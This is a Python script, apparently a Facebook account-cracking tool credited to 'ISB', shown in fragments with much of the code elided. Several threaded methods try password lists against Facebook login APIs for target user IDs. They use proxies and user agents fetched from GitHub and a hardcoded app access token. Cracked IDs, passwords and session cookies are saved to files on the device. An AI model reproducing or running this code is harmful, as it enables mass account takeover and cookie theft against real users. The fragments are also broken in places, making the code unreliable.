""""
Script open source by ISB©
Orignal code of ISB
Github : imranjan110
Give credit to ISB if you dont want to give credit
...
try:
	...
	os.system('python ISB.py')
	
print('[•] Join Our Group')
os.system('xdg-open https://facebook.com/groups/1764241843823035/')

try:
	prox= requests.get('https://raw.githubusercontent.com/imranjan110/data/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://github.com/imranjan110/Sindhi/data/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/imranjan110/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
\033[1;37m--------------------------------------------------
[~] OWNER   : SINDHI IMRAN 
[~] Facebook : SINDHI IMRAN 
[~] Tool     : Ghareebo ke lie 🤷
[~] Version  : 0.1
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
...
def pak():
		...
		with tred(max_workers=30) as UMAR:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					UMAR.submit(UMAR1,ids,passlist)
				if mthd in ['2','02']:
					UMAR.submit(UMAR2,ids,passlist)
				if mthd in ['3','03']:
					UMAR.submit(UMAR3,ids,passlist)
				if mthd in ['4','04']:
					UMAR.submit(UMAR4,ids,passlist)
				if mthd in ['5','05']:
					UMAR.submit(UMAR5,ids,passlist)
				if mthd in ['6','06']:
					UMAR.submit(UMAR6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [ISB-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [UMAR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ISB-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ISB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ISB-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ISB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ISB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ISB-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ISB-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ISB-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ISB-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/ISB-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ISB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [UMAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/UMAR-ISB.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ISB-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ISB-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [ISB-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ISB-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ISB-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ISB-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			ISB=session.cookies.get_dict().keys()
			if "c_user" in ISB:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [ISB-OK] %s | %s'%(ids,pas))
				open('/sdcard/ISB-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ISB:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [ISB-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ISB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ISB-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ISB-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			UMAR=session.cookies.get_dict().keys()
			if "c_user" in UMAR:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [ISB-OK] %s | %s'%(ids,pas))
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ISB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [ISB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISB-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def UMAR2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ISB-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ISB-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [ISB-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/ISB-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def UMAR3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/ISB-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ISB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def ISB4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ISB-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [ISB-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [ISB-OK] '+uid+' | '+pas)
						open('/sdcard/ISB-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [ISB-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/ISB-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
